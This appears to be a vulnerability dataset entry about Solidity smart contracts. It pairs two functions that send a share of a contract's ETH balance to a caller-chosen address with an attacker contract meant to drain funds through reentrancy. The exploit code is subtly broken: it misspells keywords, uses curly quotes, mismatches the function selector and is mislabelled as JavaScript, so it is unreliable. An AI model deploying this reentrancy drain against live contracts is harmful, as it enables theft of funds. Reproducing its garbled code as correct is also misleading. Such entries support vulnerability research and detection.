## Vulnerable Code

```javascript
**Instance_1**
 function sendEthProportion(address target, bytes data, uint256 mul, uint256 div) external {
        uint256 value = address(this).balance.mul(mul).div(div);
        // solium-disable-next-line security/no-call-value
        require(target.call.value(value)(data));   //vulnerability position
}


**Instance_2**
    function kyberSendEthProportion(IKyberNetworkProxy _kyber, ERC20 _fromToken, address _toToken, uint256 _mul, uint256 _div) external {
        uint256 value = address(this).balance.mul(_mul).div(_div);
        _kyber.trade.value(value)(
            _fromToken,
            value,
            _toToken,
            this,
            1 << 255,
            0,
            0
        );
    }

```



## Exploit Code

```javascript
Contract Attack{
    uint count;
    address victimAddress;
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("startAttack()"));
    
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    funciton startAttack(address _address) payable{
        for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“sendEthProportion(address, bytes,  uint256,  uint256)”)), this, bs4, 10, 1);
        }
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position: IF argument "target"" is transmited from a malicious address, the method of startAttack can be a malicious function to reentrancy.
